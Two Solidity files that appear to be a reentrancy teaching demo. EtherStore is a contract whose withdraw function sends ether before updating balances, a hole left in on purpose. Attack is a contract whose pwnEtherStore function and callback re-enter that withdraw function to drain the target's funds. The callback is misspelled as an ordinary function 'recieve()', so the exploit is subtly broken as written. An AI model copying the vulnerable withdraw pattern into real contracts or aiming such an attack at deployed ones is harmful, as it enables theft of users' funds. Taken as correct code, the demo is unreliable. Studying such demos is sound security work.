contract/Attack.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.0;

import "./EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  uint256 public balance;

  // intialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) payable{
      etherStore = EtherStore(payable(_etherStoreAddress));

      balance = address(this).balance;
  }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds{value:1 ether}();
      balance -= msg.value;
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      payable(msg.sender).transfer(address(this).balance);
  }
    
  // fallback function - where the magic happens
  function recieve() payable external {
      if (address(etherStore).balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
      balance += msg.value;
  }
}

contract/EtherStore.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.0;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    uint256 public balance;

    constructor() payable {
        balance = address(this).balance;
    }
    
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
        (bool succ, ) = payable(msg.sender).call{value:_weiToWithdraw}("");
        require(succ, "tx failed");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

    receive() external payable { 
        balance += msg.value;
    }

    function sendEtherToSelf(uint256 amount) public {
        require(amount < balance, "Insufficient balance");
        (bool succ, ) = payable(address(this)).call{value:amount}("");
        require(succ, "Trans failed");
        balance -= amount;
    }
 }

